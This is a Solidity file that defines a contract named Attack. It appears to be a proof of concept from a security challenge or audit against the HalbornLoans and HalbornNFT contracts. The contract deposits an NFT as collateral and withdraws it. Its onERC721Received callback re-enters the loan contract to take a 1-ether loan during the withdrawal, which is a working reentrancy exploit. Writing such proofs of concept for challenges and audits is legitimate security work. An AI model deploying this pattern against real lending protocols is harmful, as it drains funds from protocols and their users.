// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {HalbornLoans} from "./HalbornLoans.sol";
import {HalbornNFT} from "./HalbornNFT.sol";
import {IERC721Receiver} from "./interface/IERC721Receiver.sol";

import "forge-std/console.sol";
import "forge-std/console2.sol";

contract Attack {
    HalbornLoans public loan;
    HalbornNFT public nft;
    constructor(address _loanAddress, address _nftAddress) {
        loan = HalbornLoans(_loanAddress);
        nft = HalbornNFT(_nftAddress);
    }

    function attack() external payable {
        nft.approve(address(loan), 1);
        loan.depositNFTCollateral(1);
        loan.withdrawCollateral(1);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (operator == address(loan)) {
            loan.getLoan(1 ether);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
